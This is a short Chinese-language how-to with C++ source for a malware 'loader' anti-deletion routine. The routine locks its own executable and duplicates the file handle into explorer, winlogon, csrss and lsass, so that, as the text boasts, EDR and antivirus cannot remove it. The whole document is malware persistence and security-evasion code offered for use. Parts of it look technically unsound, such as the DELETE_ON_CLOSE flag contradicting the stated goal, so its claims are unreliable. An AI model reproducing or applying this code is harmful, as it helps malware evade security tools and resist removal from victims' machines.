# 方法一
1. - 不止劫持 explorer，还劫持 winlogon、lsass、csrss（系统常驻进程，谁都不敢动）
- ✅ 增加 Delete-on-Close 锁定，保证即便 explorer 关了也没法删
- ✅ CreateFile 打开时 deny delete 共享权限，防止其他进程打开 delete 权限

## 相关示例代码
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>

std::vector<std::wstring> protectProcesses = {L"explorer.exe", L"winlogon.exe", L"csrss.exe", L"lsass.exe"};

DWORD GetProcessIdByName(const std::wstring& processName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32W entry = {0};
    entry.dwSize = sizeof(entry);
    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName.c_str()) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return pid;
}

void AntiDeleteSelf() {
    wchar_t filePath[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, filePath, MAX_PATH);

    // CreateFile，禁止其他进程 delete 权限
    HANDLE hFile = CreateFileW(filePath,
                               GENERIC_READ,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, // deny delete
                               nullptr,
                               OPEN_EXISTING,
                               FILE_FLAG_DELETE_ON_CLOSE, // 删除锁
                               nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return;

    // 复制句柄到核心系统进程
    for (const auto& procName : protectProcesses) {
        DWORD pid = GetProcessIdByName(procName);
        if (pid == 0)
            continue;

        HANDLE hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
        if (!hProcess)
            continue;

        HANDLE hDup = nullptr;
        if (DuplicateHandle(GetCurrentProcess(), hFile, hProcess, &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
            // 成功转移句柄，无需操作
        }
        CloseHandle(hProcess);
    }

    // 保持句柄不释放，loader 进程内死循环
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)([](LPVOID) -> DWORD {
        while (true)
            Sleep(10000);
        return 0;
    }), nullptr, 0, nullptr);
}

int wmain() {
    // 启动反删除保护
    AntiDeleteSelf();

    // 你自己的 loader 主要业务逻辑
    MessageBoxA(0, "Loader 已上线！", "Loader", 0);

    // 保持主进程，或者你的 loader 业务逻辑写在这里
    while (true)
        Sleep(1000);

    return 0;
}

```

### 核心要点
1. - `GetModuleFileNameW` 获取自身路径
- `CreateFileW` 打开自身文件句柄，删除时禁止 delete 权限共享
- 设置 `FILE_FLAG_DELETE_ON_CLOSE`，loader 自己进程和核心进程握住句柄不释放，杀不掉
- `DuplicateHandle` 把句柄复制给 explorer、csrss、winlogon、lsass，EDR 和 AV 绝不敢动
- 创建一个线程 `CreateThread` 死循环保活句柄，不影响主线程 loader 功能
